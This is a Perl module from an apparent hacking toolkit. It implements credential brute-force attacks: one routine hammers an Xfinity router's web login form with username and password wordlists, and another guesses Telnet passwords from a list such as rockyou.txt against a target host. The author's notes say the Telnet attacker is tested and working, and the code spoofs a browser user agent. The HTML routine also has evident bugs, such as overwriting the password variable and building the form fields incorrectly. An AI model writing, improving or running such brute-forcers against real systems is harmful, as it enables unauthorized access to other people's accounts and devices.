# in further versions, please write a module for the colors ~ ArkAngeL43
# package helps with calling brute forcing tools

=head1 notes 

Brute forcing tools i could not impliment into perl and reasons:
    Could not impliment FTP brute forcer, this was because the ftp lib was a bit ouch meaning gone bad or glitchy
    Could not impliment ZIP brute forcer, this was because the ZIP lib was a bit ouch meaning gone bad or glitchy
    Could not impliment CPANEL brute forcer, the script was outdated for modules or glitchy
    



Was able to impliment:
    Telnet brute 
    Xfinity post HTML form methodized brute
    1

=cut
package Brute;

use strict;                                       # Init st
use LWP;                                          # Init HTML Brute
use LWP::Simple;                                  # Init URL parsing encoding
use Net::FTP;                                     # Init FTP  Brute
use Net::Telnet ();                               # Init TELN Brute
use IO::Socket;                                   # Init Socks
use MIME::Base64;                                 # Init string conversion
use feature 'say';                                # Init features



my @days                   = qw(Sun Mon Tue Wed Thu Fri Sat Sun);
my @months                 = qw(Jan Feb Mar Arp May Jun Jul Aug Sep Oct Nov Dev);
my @passwords;                                    # Set an empty passwords array
my @usernames;                                    # Set an empty username  array
my $blue                   = "\033[34m";          # Set color blue
my $Bold_Blue              = "\033[1;34m";        # Set color bold blue
my $red                    = "\033[31m";          # Set color red
my $wht                    = "\033[37m";          # Set color white
my $BLK                    = "\033[0;30m";        # Set color black
my $RED                    = "\033[0;31m";        # Set color red 
my $GRN                    = "\033[0;32m";        # Set color green
my $YEL                    = "\033[0;33m";        # Set color yellow
my $BLU                    = "\033[0;34m";        # Set color blue
my $MAG                    = "\033[0;35m";        # Set color magenta
my $CYN                    = "\033[0;36m";        # Set color cyan
my $WHT                    = "\033[0;37m";        # Set color white




$| = 1;
my $user_agent = LWP::UserAgent->new;
$user_agent->agent("Mozilla/5.0 (Windows NT 5.1; U; ru) Opera 8.51");
$user_agent->timeout(10);

# does not work so much
# XFINITY localhost brute forcer
sub _HTML_xfinity {
    my $pswd_file = shift;
    my $uwd_file  = shift;
    my $url       = shift;
    open(PWD, $pswd_file) or die("<RR6> Logging Module: File Module: Brute Module: Could not open password file, something went wrong $!");
    while(<PWD>) {
        push(@passwords, $_);
    }
    close PWD;
    open(UWD, $uwd_file) or die("<RR6> Logging Module: File Module: Brute Module: Could not open username list or file, something went wrong $!");
    while(<UWD>) {
        push(@usernames, $_);
    }
    close UWD;
    print "[+] Setting: Pushed all usernames from file into usernames array\n";
    print "[+] Setting: Pushed all passwords from file into passwords array\n";
    foreach my $user (@usernames) {
        foreach my $password (@passwords) {
            print "[+] Setting: Trying password $password | for user $user\n";
            chomp($password = $_);
            my %http_form = ($user => $user, $password => $password); 
            my $response = $user_agent->post($url, \%http_form)->as_string; 
            unless($response =~ m/jAlert..Authentication failed....ERROR./i) { 
                print "<RR6> Brute Module: [ <<>> ] Successful login as $user with $password"; 
                return
            }
        }
    }
}

sub _Telnet_ {
    my $i = 1;
    my $host = shift; # Set hostname eg:(10.0.0.1)
    my $user = shift; # Set username 
    my $dict = shift; # Set password list
    print "[+] Setting: Attacking Hostname: $host\n";
    print "[+] Setting: Attacking Username: $user\n";
    print "[+] Setting: Using current file: $dict\n";
    open(DICT, "<$dict") or die("<RR6> File module: Could not open up wordlist\n");
    while(<DICT>) {
        chomp $_;
        my $t = new Net::Telnet(Host => $host);
        eval {
            $t->login($user, $_)
        };
        if ($@) {
            $i++;
            print "<RR6> Telnet Module: Failed to find the password - try [$i] Pass - $_\n";
        } else {
            print "<RR6> Telnet Module: Found password for host $host | Pass ===>> $_ | username ===>> $user\n";
        }
        $t->close;
    }
    close(DICT);
}



=head1 tested


telnet_brute("10.0.0.1", "admin", "/usr/share/wordlists/rockyou.txt");        tested and is working
_HTML_xfinity("/usr/share/wordlists/rockyou.txt", "users.txt", "");           tested and is a bit wack


=cut
1;